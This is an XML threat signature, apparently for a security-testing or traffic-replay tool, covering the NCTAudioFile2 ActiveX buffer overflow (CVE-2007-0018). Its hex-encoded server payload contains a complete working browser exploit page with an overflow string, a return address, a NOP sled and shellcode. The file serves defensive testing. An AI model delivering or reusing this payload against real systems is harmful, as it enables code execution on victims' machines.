<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="NCTsoft Products NCTAudioFile2 ActiveX Control Buffer Overflow"/>
    <EngDesc display="true" value="This threat downloads a malicious web page which triggers a buffer overflow in the NCTaudioFile ActiveX application, this threat is delived via HTTP port 80."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="NCTsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="NCTsoft_NCTAudioFile2"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="NCTsoft_NCTAudioFile2_2.x"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.milw0rm.com/exploits/3808"/>
    <CVEID display="true" value="CVE-2007-0018"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Mike Davis"/>
    <ID display="true" value="b0bb15fe44597f5ddc00f375d860d36e"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="true"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="high"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value="integrity"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="633135356084843750"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1177984428" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
  </Variables>
  <Loops>
    <for index="E">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
      <for index="K"/>
    </for>
    <for index="F">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="E" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F746573742E68746D20485454502F312E300D0A557365722D4167656E743A20576765742F312E31302E320D0A4163636570743A202A2F2A0D0A486F73743A20646D6563682E6D65647765622E636F6D0D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="F" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204D6F6E2C2033302041707220323030372030353A32343A303320474D540D0A5365727665723A204170616368650D0A4C6173742D4D6F6469666965643A204D6F6E2C2033302041707220323030372030353A32333A303120474D540D0A455461673A20223133323939382D316135342D34326634646164633166373430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20323933370D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F706C61696E0D0A0D0A3C68746D6C3E0D0A3C6F626A65637420636C61737369643D27636C7369643A37373832394631342D443931312D343046462D413246302D443131444238443644304243272069643D274E4354417564696F46696C6532273E3C2F6F626A6563743E0D0A20203C696E707574206C616E67756167653D5642536372697074206F6E636C69636B3D7472794D65282920747970653D627574746F6E2076616C75653D22436C69636B206865726520746F207374617274207468652074657374223E0D0A2020203C736372697074206C616E6775616765203D20277662736372697074273E0D0A20202020537562207472794D650D0A0D0A2020202020272D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D0D0A2020202020275B506F43325D204945204E4354417564696F46696C65322E417564696F46696C6520416374697665582052656D6F746520537461636B204F766572666C30770D0A2020202020276F726967696E616C2061647669736F72793A20687474703A2F2F736563756E69612E636F6D2F61647669736F726965732F32333437352F0D0A202020202027617574686F723A207368696E6E61690D0A2020202020276D61696C3A207368696E6E61695B61745D6175746973746963695B646F745D6F72670D0A202020202027736974653A20687474703A2F2F7368696E6E61692E616C74657276697374612E6F72670D0A2020202020276261736564206F6E3A20687474703A2F2F7777772E6D696C7730726D2E636F6D2F6578706C6F6974732F333732380D0A20202020202728736565207768617420496E54654C20736169642061626F75742057696E2058502050726F2053503220616E64204945372C20656E6A6F792062726F746861203B290D0A2020202020276D6F64696669656420666F7220776F726B696E67206F6E2057696E2058502050726F205350322077697468204945372066756C6C20706174636865640D0A2020202020272D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D0D0A0D0A202020202062756666203D20537472696E672028343131362C20224122290D0A0D0A20202020206765745F454950203D20756E657363617065282225454225414125443725373722292027307837374437414145422063616C6C20657370202866726F6D207573657233322E646C6C290D0A0D0A20202020206E6F70203D20756E657363617065282225393025393025393025393025393025393025393025393025393025393022290D0A0D0A20202020207368656C6C636F6465203D20756E657363617065282225656225303325353925656225303525653825663825666625666625666625346625343925343925343925343925343922292026205F0D0A2020202020202020202020202020202020756E657363617065282225343925353125356125353625353425353825333625333325333025353625353825333425343125333025343225333622292026205F0D0A2020202020202020202020202020202020756E657363617065282225343825343825333025343225333325333025343225343325353625353825333225343225343425343225343825333422292026205F0D0A2020202020202020202020202020202020756E657363617065282225343125333225343125343425333025343125343425353425343225343425353125343225333025343125343425343122292026205F0D0A2020202020202020202020202020202020756E657363617065282225353625353825333425356125333825343225343425346125346625346425346525346625346125346525343625353422292026205F0D0A2020202020202020202020202020202020756E657363617065282225343225333025343225353025343225353025346225353825343525353425346525353325346225353825346525333722292026205F0D0A2020202020202020202020202020202020756E657363617065282225343525353025346125343725343125333025346625346525346225333825346625343425346125353125346225343822292026205F0D0A2020202020202020202020202020202020756E657363617065282225346625353525343225343225343125333025346225346525343925343425346225343825343625343325346225333822292026205F0D0A2020202020202020202020202020202020756E657363617065282225343125333025353025346525343125353325343225346325343925343925346525346125343625353825343225346322292026205F0D0A2020202020202020202020202020202020756E657363617065282225343625353725343725353025343125346325346325346325346425353025343125333025343425346325346225346522292026205F0D0A2020202020202020202020202020202020756E657363617065282225343625346625346225353325343625333525343625333225343625333025343525333725343525346525346225343822292026205F0D0A2020202020202020202020202020202020756E657363617065282225346625333525343625333225343125353025346225346525343825353625346225333825346525353025346225353422292026205F0D0A2020202020202020202020202020202020756E657363617065282225346225343825346625353525346525333125343125333025346225346525346225333825346525343125346225333822292026205F0D0A2020202020202020202020202020202020756E657363617065282225343125333025346225346525343925353825346525333525343625343225343625353025343325346325343125343322292026205F0D0A2020202020202020202020202020202020756E657363617065282225343225346325343625333625346225343825343225333425343225333325343525333825343225346325346125333722292026205F0D0A2020202020202020202020202020202020756E657363617065282225346525333025346225343825343225333425346525353025346225343825343225353725346525333125346425346122292026205F0D0A2020202020202020202020202020202020756E657363617065282225346225333825346125343625346125353025346225346525343925353025346225343825343225333825343225346222292026205F0D0A2020202020202020202020202020202020756E657363617065282225343225333025343225353025343225333025346225343825346125333625346525353325346625333525343125333322292026205F0D0A2020202020202020202020202020202020756E657363617065282225343825346625343225343625343825333525343925353825346125346625343325343825343225346325346225353722292026205F0D0A2020202020202020202020202020202020756E657363617065282225343225353525346125343625343225346625346325343825343625353025346625333525346125343625346125343922292026205F0D0A2020202020202020202020202020202020756E657363617065282225353025346625346325333825353025333025343725353525346625346625343725346525343325353625343125333622292026205F0D0A2020202020202020202020202020202020756E657363617065282225346525343625343325343625353025353225343525333625346125333725343525333625343225333025356122290D0A0D0A2020202020656767203D2062756666202B206765745F454950202B206E6F70202B207368656C6C636F6465202B206E6F700D0A0D0A20202020204E4354417564696F46696C65322E536574466F726D61744C696B6553616D706C65206567670D0A0D0A20202020456E64205375620D0A2020203C2F7363726970743E0D0A3C2F68746D6C3E0D0A0D0A23206D696C7730726D2E636F6D205B323030372D3034" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
